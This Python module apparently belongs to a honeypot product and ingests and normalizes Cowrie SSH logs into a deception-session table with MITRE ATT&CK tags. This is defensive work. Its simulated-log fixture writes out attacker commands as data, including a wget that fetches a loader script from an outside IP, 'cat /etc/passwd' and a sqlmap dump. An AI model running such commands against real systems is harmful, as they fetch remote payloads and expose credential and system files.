"""Cowrie Honeypot Log Ingestion & Normalization Engine for CipherTwin.

Ingests live Cowrie JSON logs into the existing deception session table.

Normalized Events Schema:
- session_id: str
- timestamp: str (ISO)
- src_ip: str
- event_type: connect | login_failed | login_success | command_input | file_download | closed
- username: Optional[str]
- password: Optional[str]
- command: Optional[str]
- mitre_technique: Optional[str]
"""
import json
import logging
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

from app.core.config import settings

logger = logging.getLogger("ciphertwin.cowrie")

# Cowrie eventid to MITRE ATT&CK technique mapping
COWRIE_EVENT_TO_MITRE = {
    "cowrie.login.failed": "T1110",         # Brute Force
    "cowrie.login.success": "T1078",        # Valid Accounts
    "cowrie.command.input": "T1059",        # Command and Scripting Interpreter
    "cowrie.session.file_download": "T1105", # Ingress Tool Transfer
    "cowrie.command.failed": "T1083",       # Discovery
}


def generate_simulated_cowrie_log(file_path: Optional[str] = None) -> int:
    """Generate a deterministic Cowrie-style log for local demonstration.

    This writes realistic event JSON to the configured Cowrie log path so the same
    parser and ingestion pipeline can ingest the same data as live Cowrie traffic.
    """
    target_path = Path(file_path or settings.cowrie_log_path)
    target_path.parent.mkdir(parents=True, exist_ok=True)

    events = [
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:00:00.000000Z",
            "session": "sim-ssh-bruteforce",
            "src_ip": "185.220.101.45",
            "dst_ip": "127.0.0.1",
            "dst_port": 2222,
            "protocol": "ssh",
            "message": "Connection from 185.220.101.45:57680",
        },
        {
            "eventid": "cowrie.login.failed",
            "timestamp": "2026-09-28T12:00:02.000000Z",
            "session": "sim-ssh-bruteforce",
            "src_ip": "185.220.101.45",
            "username": "root",
            "password": "admin123",
            "message": "login attempt [root/admin123] failed",
        },
        {
            "eventid": "cowrie.login.failed",
            "timestamp": "2026-09-28T12:00:03.000000Z",
            "session": "sim-ssh-bruteforce",
            "src_ip": "185.220.101.45",
            "username": "root",
            "password": "toor",
            "message": "login attempt [root/toor] failed",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:00:04.000000Z",
            "session": "sim-ssh-bruteforce",
            "src_ip": "185.220.101.45",
            "input": "wget http://185.220.101.45/loader.sh",
            "message": "CMD: wget http://185.220.101.45/loader.sh",
        },
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:05:01.000000Z",
            "session": "sim-ssh-shell",
            "src_ip": "198.51.100.77",
            "dst_ip": "127.0.0.1",
            "dst_port": 2222,
            "protocol": "ssh",
            "message": "Connection from 198.51.100.77:50122",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:05:02.000000Z",
            "session": "sim-ssh-shell",
            "src_ip": "198.51.100.77",
            "input": "uname -a",
            "message": "CMD: uname -a",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:08:04.000000Z",
            "session": "sim-ssh-shell",
            "src_ip": "198.51.100.77",
            "input": "whoami && id",
            "message": "CMD: whoami && id",
        },
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:09:01.000000Z",
            "session": "sim-web-enum",
            "src_ip": "203.0.113.22",
            "dst_ip": "127.0.0.1",
            "dst_port": 8080,
            "protocol": "http",
            "message": "Connection from 203.0.113.22:55128",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:09:07.000000Z",
            "session": "sim-web-enum",
            "src_ip": "203.0.113.22",
            "input": "ls /etc/passwd",
            "message": "CMD: ls /etc/passwd",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:10:00.000000Z",
            "session": "sim-web-enum",
            "src_ip": "203.0.113.22",
            "input": "cat /etc/passwd",
            "message": "CMD: cat /etc/passwd",
        },
        {
            "eventid": "cowrie.session.connect",
            "timestamp": "2026-09-28T12:12:00.000000Z",
            "session": "sim-db-probe",
            "src_ip": "45.77.12.44",
            "dst_ip": "127.0.0.1",
            "dst_port": 3306,
            "protocol": "mysql",
            "message": "Connection from 45.77.12.44:41231",
        },
        {
            "eventid": "cowrie.command.input",
            "timestamp": "2026-09-28T12:12:04.000000Z",
            "session": "sim-db-probe",
            "src_ip": "45.77.12.44",
            "input": "sqlmap -u 'http://target/db?id=1' --dump",
            "message": "CMD: sqlmap -u 'http://target/db?id=1' --dump",
        },
    ]

    with target_path.open("w", encoding="utf-8") as handle:
        for event in events:
            handle.write(json.dumps(event) + "\n")

    return len(events)


class CowrieParser:
    """Parses and normalizes Cowrie JSON logs."""

    @staticmethod
    def parse_line(line: str) -> Optional[Dict[str, Any]]:
        """Parse one raw Cowrie JSON log line into normalized event format."""
        line = line.strip()
        if not line:
            return None
        try:
            data = json.loads(line)
        except json.JSONDecodeError:
            return None

        eventid = data.get("eventid", "")
        session_id = data.get("session")
        timestamp = data.get("timestamp")
        src_ip = data.get("src_ip")
        if not eventid or not session_id or not timestamp or not src_ip:
            return None
        try:
            datetime.fromisoformat(timestamp.replace("Z", "+00:00"))
        except (TypeError, ValueError):
            return None

        normalized = {
            "session_id": session_id,
            "timestamp": timestamp,
            "src_ip": src_ip,
            "raw_eventid": eventid,
            "mitre_technique": COWRIE_EVENT_TO_MITRE.get(eventid),
            "protocol": data.get("protocol"),
            "src_port": data.get("src_port"),
            "dst_ip": data.get("dst_ip"),
            "dst_port": data.get("dst_port"),
            "request": data.get("input") or data.get("url") or data.get("message"),
        }

        if eventid == "cowrie.session.connect":
            normalized["event_type"] = "connect"
        elif eventid == "cowrie.login.failed":
            normalized["event_type"] = "login_failed"
            normalized["username"] = data.get("username")
            normalized["password"] = data.get("password")
        elif eventid == "cowrie.login.success":
            normalized["event_type"] = "login_success"
            normalized["username"] = data.get("username")
            normalized["password"] = data.get("password")
        elif eventid == "cowrie.command.input":
            normalized["event_type"] = "command_input"
            normalized["command"] = data.get("input")
        elif eventid == "cowrie.session.file_download":
            normalized["event_type"] = "file_download"
            normalized["url"] = data.get("url")
            normalized["outfile"] = data.get("outfile")
        elif eventid == "cowrie.session.closed":
            normalized["event_type"] = "closed"
            normalized["duration"] = data.get("duration")
        else:
            normalized["event_type"] = "unknown"
            normalized["details"] = data.get("message", "")

        return normalized

    def parse_file(self, file_path: str) -> List[Dict[str, Any]]:
        """Parse all events from a Cowrie JSON log file."""
        p = Path(file_path)
        if not p.exists():
            return []
        events = []
        try:
            with open(p, "r", encoding="utf-8") as f:
                for line in f:
                    ev = self.parse_line(line)
                    if ev:
                        events.append(ev)
        except Exception as e:
            logger.error("Failed to read Cowrie log file %s: %s", file_path, e)
        return events


class CowrieService:
    """Manages Cowrie log ingestion and mode status."""

    def __init__(self):
        self.parser = CowrieParser()

    @staticmethod
    def simulation_mode_enabled() -> bool:
        return str(settings.deception_mode).upper() == "SIMULATED" or (
            bool(settings.enable_simulation) and str(settings.deception_mode).upper() != "COWRIE"
        )

    def _ensure_input_file(self, file_path: Optional[str] = None) -> str:
        path = file_path or settings.cowrie_log_path
        mode = str(settings.deception_mode).upper()
        if mode == "SIMULATED" or (settings.enable_simulation and mode != "COWRIE"):
            log_path = Path(path)
            log_path.parent.mkdir(parents=True, exist_ok=True)
            if not log_path.exists() or not self.parser.parse_file(str(log_path)):
                generate_simulated_cowrie_log(str(log_path))
        return path

    @staticmethod
    def _infer_fidelity(events: List[Dict[str, Any]]) -> str:
        commands = " ".join((event.get("command") or "") for event in events).lower()
        if any((event.get("raw_eventid") == "cowrie.login.failed") for event in events) and (
            "root" in commands or "wget" in commands or "chmod" in commands or "curl" in commands
        ):
            return "HIGH"
        if any("uname" in commands or "whoami" in commands or "id" in commands for _ in [0]):
            return "MEDIUM"
        if commands:
            return "LOW"
        return "MEDIUM"

    def check_health(self) -> Dict[str, Any]:
        """Truthfully report Cowrie status.
        Detects live Cowrie container on port 2222 or a local simulated log source.
        """
        import socket

        simulation = self.simulation_mode_enabled()
        port_open = False
        banner = ""
        if not simulation:
            try:
                s = socket.socket()
                s.settimeout(1.5)
                s.connect(("127.0.0.1", 2222))
                banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
                s.close()
                port_open = True
            except Exception:
                pass

        log_path = Path(settings.cowrie_log_path)
        log_path.parent.mkdir(parents=True, exist_ok=True)
        if simulation and (not log_path.exists() or not self.parser.parse_file(str(log_path))):
            generate_simulated_cowrie_log(str(log_path))

        has_logs = log_path.exists()
        events = self.parser.parse_file(str(log_path)) if has_logs else []
        last_event = max((event["timestamp"] for event in events), default=None)

        if simulation:
            return {
                "status": "HEALTHY",
                "mode": "SIMULATED",
                "cowrie_status": "SIMULATION",
                "container_running": False,
                "port": None,
                "banner": "Local Cowrie simulation active",
                "log_status": "AVAILABLE",
                "log_file": str(log_path),
                "total_events_collected": len(events),
                "last_event": last_event,
                "deception_ready": True,
                "message": "Local simulation pipeline is active and ingesting Cowrie-style events.",
            }

        status = "HEALTHY" if port_open and has_logs else "DEGRADED" if port_open or has_logs else "UNAVAILABLE"
        log_status = "AVAILABLE" if has_logs else "UNAVAILABLE"
        return {
            "status": status,
            "mode": "COWRIE" if port_open else "OFFLINE",
            "cowrie_status": "RUNNING" if port_open else "OFFLINE",
            "container_running": port_open,
            "port": 2222,
            "banner": banner or None,
            "log_status": log_status,
            "log_file": str(log_path) if has_logs else None,
            "total_events_collected": len(events),
            "last_event": last_event,
            "deception_ready": port_open and has_logs,
            "message": None if port_open else "Cowrie SSH listener is offline.",
        }

    def ingest_logs_to_db(self, db, file_path: Optional[str] = None) -> int:
        """Upsert observed Cowrie sessions into the existing deception log table."""
        from app.models.deception import DecoySession

        if file_path is None and self.simulation_mode_enabled():
            existing_rows = db.query(DecoySession).filter(DecoySession.mode == "COWRIE").count()
            if existing_rows > 0:
                return existing_rows

        raw_path = file_path or settings.cowrie_log_path
        path = self._ensure_input_file(raw_path)
        events = self.parser.parse_file(path)
        if not events:
            return 0

        mode_name = "COWRIE"

        sessions: Dict[str, List[Dict[str, Any]]] = {}
        for ev in events:
            sessions.setdefault(ev["session_id"], []).append(ev)

        existing_sessions = db.query(DecoySession).filter(DecoySession.mode == mode_name).all()
        existing_by_session = {}
        for record in existing_sessions:
            if record.notes and record.notes.startswith("Cowrie session ID: "):
                existing_by_session[record.notes.removeprefix("Cowrie session ID: ")] = record

        count = 0
        for sess_id, ev_list in sessions.items():
            cmds = [e["command"] for e in ev_list if e.get("command")]
            creds = [
                f"{e.get('username')}:{e.get('password')}"
                for e in ev_list
                if e.get("username") and e.get("password")
            ]
            first = ev_list[0]
            observed_events = [
                {
                    "timestamp": event["timestamp"],
                    "event_id": event["raw_eventid"],
                    "event_type": event["event_type"],
                    "src_ip": event["src_ip"],
                    "src_port": event.get("src_port"),
                    "protocol": event.get("protocol"),
                    "dst_ip": event.get("dst_ip"),
                    "dst_port": event.get("dst_port"),
                    "request": event.get("request"),
                    "mitre_technique": event.get("mitre_technique"),
                }
                for event in ev_list
            ]
            timestamp = datetime.fromisoformat(first["timestamp"].replace("Z", "+00:00"))
            protocol = next((event.get("protocol") for event in ev_list if event.get("protocol")), None)
            username = next((event.get("username") for event in ev_list if event.get("username")), None)
            record = existing_by_session.get(sess_id)
            if record is None:
                record = DecoySession(mode=mode_name, decoy_type=protocol or "ssh")
                db.add(record)

            record.threat_id = None
            record.timestamp = timestamp
            record.decoy_type = protocol or "ssh"
            record.fidelity = self._infer_fidelity(ev_list)
            record.reason = "Observed Cowrie honeypot interaction" if mode_name == "COWRIE" else "Observed simulated Cowrie interaction"
            record.confidence = None
            record.mode = mode_name
            record.actor = username
            record.source_ip = first["src_ip"]
            record.activity = json.dumps(observed_events)
            record.commands = json.dumps(cmds)
            record.pages = json.dumps([])
            record.credentials_used = ",".join(creds[:5]) or None
            record.persona = None
            record.banner = None
            record.notes = f"Cowrie session ID: {sess_id}"
            count += 1

        db.commit()
        return count


# Global singleton instance
cowrie_service = CowrieService()
check_cowrie_health = cowrie_service.check_health
